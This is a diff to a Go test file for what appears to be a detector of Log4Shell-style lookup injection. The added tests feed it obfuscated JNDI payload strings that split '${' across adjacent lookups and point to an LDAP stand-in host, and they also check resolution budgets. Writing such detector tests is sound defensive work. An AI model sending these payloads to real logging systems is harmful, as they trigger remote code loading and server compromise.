@@ -339,7 +339,7 @@ func TestResolveLookupSummaries(t *testing.T) {
 	if res.Total != 5 {
 		t.Errorf("Total = %d, want 5 (placeholders and nested lookups included)", res.Total)
 	}
-	var prefixes []string
+	prefixes := make([]string, 0, len(res.Lookups))
 	for _, l := range res.Lookups {
 		prefixes = append(prefixes, l.Prefix)
 	}
@@ -585,6 +585,76 @@ func TestAddSources(t *testing.T) {
 	}
 }
 
+func TestResolveFindsTokensFormedAcrossLookups(t *testing.T) {
+	// Two adjacent lookup values ("$" and "{") form a new "${" in the output. A
+	// later substitution pass over that output would run the payload.
+	tests := []struct {
+		name  string
+		input string
+	}{
+		{"adjacent lookups", "${::-$}${::-{}jndi:ldap://x.invalid/a}"},
+		{"literal dollar then lookup brace", "$${::-{}jndi:ldap://x.invalid/a}"},
+		{"split across lower and upper", "${lower:$}${upper:{}jndi:ldap://x.invalid/a}"},
+		{"embedded in text", "prefix ${::-$}${::-{}jndi:ldap://x.invalid/a} suffix"},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			res := Resolve(tc.input, Limits{})
+			if !res.Complete() {
+				t.Fatalf("Exhausted = %v", res.Exhausted)
+			}
+			var found *Finding
+			for i := range res.Findings {
+				if res.Findings[i].Kind == FindingJNDI {
+					found = &res.Findings[i]
+				}
+			}
+			if found == nil {
+				t.Fatalf("no jndi finding: %+v", res)
+			}
+			if !found.Expanded || found.Scheme != "ldap" || found.Key != "ldap://x.invalid/a" {
+				t.Errorf("finding = %+v, want an expanded ldap finding", *found)
+			}
+		})
+	}
+}
+
+func TestResolveAssembledPassIsBoundedAndQuiet(t *testing.T) {
+	// A harmless unresolved lookup next to a resolvable one is evaluated twice
+	// (once in the text, once in the assembled output) but never reported.
+	res := Resolve("${lower:A} ${foo:bar}", Limits{})
+	if len(res.Findings) != 0 || !res.Complete() {
+		t.Fatalf("findings = %+v, exhausted = %v", res.Findings, res.Exhausted)
+	}
+	expanded := 0
+	for _, l := range res.Lookups {
+		if l.Expanded {
+			expanded++
+		}
+	}
+	if expanded == 0 {
+		t.Error("the assembled-output pass should have re-evaluated the unresolved lookup")
+	}
+
+	// Large text with a single lookup is assembled without tripping the small
+	// per-value cap.
+	big := strings.Repeat("a", 100<<10) + "${lower:A}"
+	if res := Resolve(big, Limits{}); res.Exhausted != BudgetNone {
+		t.Errorf("large text with one lookup: Exhausted = %v, want none", res.Exhausted)
+	}
+
+	// The assembled output is capped by MaxStageBytes.
+	if res := Resolve(strings.Repeat("a", 64)+"${lower:A}", Limits{MaxStageBytes: 32}); res.Exhausted != BudgetStageBytes {
+		t.Errorf("assembled output over MaxStageBytes: Exhausted = %v, want stage-bytes", res.Exhausted)
+	}
+
+	// Text that is only placeholders is never assembled.
+	only := Resolve("${a} ${b} ${c}", Limits{})
+	if only.Total != 3 || len(only.Lookups) != 0 {
+		t.Errorf("placeholders: Total = %d, Lookups = %d", only.Total, len(only.Lookups))
+	}
+}
+
 func TestResolveExhaustionPaths(t *testing.T) {
 	// Openers that only appear after re-expansion exceed the nesting budget when
 	// the expanded text is parsed.
@@ -610,7 +680,7 @@ func TestResolveExhaustionPaths(t *testing.T) {
 		t.Fatalf("parse: %v", b)
 	}
 	r := &resolver{lim: Limits{MaxValueBytes: 3}.withDefaults(), res: &Resolution{}}
-	if got := r.evalParts(root, 0, true); got != "" || r.exhausted != BudgetValueBytes {
+	if got := r.evalParts(root, 0, true, r.lim.MaxValueBytes, BudgetValueBytes); got != "" || r.exhausted != BudgetValueBytes {
 		t.Errorf("evalParts = %q, exhausted = %v, want empty and value-bytes", got, r.exhausted)
 	}
 
@@ -630,7 +700,7 @@ func TestResolveExhaustionPaths(t *testing.T) {
 	if got := r.evalNode(root.parts[1].lookup, 0); got.val != "" || len(r.res.Lookups) != 0 {
 		t.Errorf("evalNode after exhaustion = %+v, lookups %d", got, len(r.res.Lookups))
 	}
-	if got := r.evalParts(root, 0, true); got != "" {
+	if got := r.evalParts(root, 0, true, r.lim.MaxValueBytes, BudgetValueBytes); got != "" {
 		t.Errorf("evalParts after exhaustion = %q, want empty", got)
 	}
 }
